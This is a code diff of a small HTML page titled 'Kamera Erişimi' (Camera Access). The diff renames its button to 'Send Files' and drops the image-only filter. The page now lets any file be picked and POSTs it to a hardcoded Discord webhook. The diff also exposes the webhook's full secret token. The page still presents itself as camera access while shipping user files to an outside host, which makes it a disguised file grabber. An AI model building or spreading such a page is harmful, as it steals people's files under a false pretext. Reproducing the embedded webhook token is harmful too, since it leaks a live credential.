@@ -5,12 +5,11 @@
   </head>
   <body>
     <h1>Kamera Erişimi</h1>
-    <button id="take-picture">Resim Çek</button>
+    <button id="take-picture">Dosyaları Gönder</button>
     <div id="picture-container"></div>
 
     <script>
       const takePictureButton = document.getElementById('take-picture');
-      const pictureContainer = document.getElementById('picture-container');
       const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
 
       takePictureButton.addEventListener('click', async () => {
@@ -27,7 +26,6 @@
                   {
                     description: 'All Files',
                     accept: {
-                      'image/*': ['.jpg', '.jpeg', '.png', '.gif', '.bmp'],
                       '*/*': ['*'],
                     },
                   },
@@ -49,9 +47,9 @@
                 method: 'POST',
                 body: formData,
               })
-             .then(response => response.json())
-             .then(data => console.log(data))
-             .catch(error => console.error(error));
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
             } else {
               console.error('Storage access permission denied.');
             }
